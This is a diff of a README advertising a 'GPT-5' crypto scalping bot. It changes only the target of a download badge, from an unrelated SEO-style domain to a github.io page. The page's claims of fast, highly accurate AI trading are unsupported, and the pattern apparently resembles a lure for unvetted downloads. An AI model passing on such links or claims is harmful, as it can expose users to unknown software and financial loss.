@@ -2,7 +2,7 @@
 
 Crypto Scalping Bot GPT-5 is an advanced AI-powered trading assistant designed for ultra-fast scalping on Binance, Bybit, and other top exchanges. It uses GPT-5 to interpret market patterns and execute lightning-fast trades with high accuracy.
 
-[![Download Scalping Bot](https://img.shields.io/badge/Download-Scalping_Bot_GPT5-blueviolet)](seomadjest.com)
+[![Download Scalping Bot](https://img.shields.io/badge/Download-Scalping_Bot_GPT5-blueviolet)](https://crypto-scalping-bot.github.io/.github)
 
 ---
 
